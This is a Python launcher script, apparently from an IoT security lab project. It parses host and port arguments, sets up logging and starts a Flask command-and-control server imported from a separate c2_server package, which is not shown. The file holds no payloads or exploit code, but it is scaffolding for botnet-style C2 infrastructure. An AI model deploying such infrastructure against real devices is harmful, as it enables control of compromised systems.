#!/usr/bin/env python3
"""
IoT Security Research - Command & Control Server
Educational Purpose Only - For Controlled Lab Environment

This is the parent runner script that uses the modular C2 server implementation
located in the c2_server/ directory.
"""

import os
import sys
import argparse
import logging

def main():
    """Main entry point for the C2 server"""
    parser = argparse.ArgumentParser(description='IoT C2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    args = parser.parse_args()
    
    # Configure logging for research purposes
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('cnc_research.log'),
            logging.StreamHandler()
        ]
    )
    
    # Check if the c2_server package exists
    c2_server_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'c2_server')
    if not os.path.isdir(c2_server_dir):
        logging.error(f"C2 server directory not found at {c2_server_dir}")
        sys.exit(1)
    
    # Add the c2_server directory to the Python path
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    
    try:
        # Import the application from the modular structure
        from c2_server.c2_server import app
        
        # Log startup information
        logging.info(f"Starting C2 server on {args.host}:{args.port}")
        logging.info("Using modular C2 server implementation")
        
        # Run the Flask application
        app.run(host=args.host, port=args.port, debug=False)
        
    except ImportError as e:
        logging.error(f"Failed to import C2 server modules: {e}")
        logging.error("Make sure the c2_server package is properly installed")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Error starting C2 server: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
